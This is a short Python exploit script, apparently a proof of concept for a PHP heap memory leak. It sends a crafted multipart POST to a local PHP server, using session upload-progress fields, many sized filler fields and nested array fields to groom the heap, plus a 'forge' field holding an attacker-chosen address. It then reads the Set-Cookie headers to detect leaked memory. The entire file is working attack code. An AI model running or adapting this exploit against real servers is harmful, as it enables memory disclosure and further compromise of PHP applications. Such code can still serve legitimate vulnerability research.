#!/usr/bin/env python3
"""B: 80B forge leak + nested-array HashTable spray.
K filler fields (48-char values -> 80B live value strings), M nested fields
aNNNN[KEY]=x (56B HashTable), one forge field (79-byte value -> 80B raw).
usage: b_htleak.py K M KEY LEAK
"""
import socket,sys,struct
K=int(sys.argv[1]); M=int(sys.argv[2]); KEY=int(sys.argv[3]); LEAK=int(sys.argv[4],0)
BND=b'B'*10
parts=[{'n':'PHPSESSID','d':b'attacksessionid0001'},{'n':'PHP_SESSION_UPLOAD_PROGRESS','d':b'pwn'}]
for i in range(K):
    parts.append({'n':str(1000+i),'d':(('v%04d'%i)+'x'*44).encode()})
for i in range(M):
    parts.append({'n':'a%04d[%d]'%(i,KEY),'d':b'x'})
v=bytearray(b'A'*79)
struct.pack_into('<Q',v,0x10,LEAK)
v[0x18:0x1a]=b'LZ'
parts.append({'n':'forge','d':bytes(v)})
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['n'].encode()+b'"\r\n\r\n'+p['d']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
data=b''
try:
    s.sendall(h+bytes(o))
    while len(data)<16000000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e: print('recv_err',repr(e))
s.close()
head,_,rest=data.partition(b'\r\n\r\n')
n=0
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        n+=1; print('SETCOOKIE_LEN',len(line)); print('VALUE',line[:100].decode('latin1','replace'))
print('HEAD_LEN',len(head),'FIELDS',K+M+3,'BODY',rest[:120].decode('latin1','replace'))
open('/tmp/b_htleak.resp','wb').write(data)
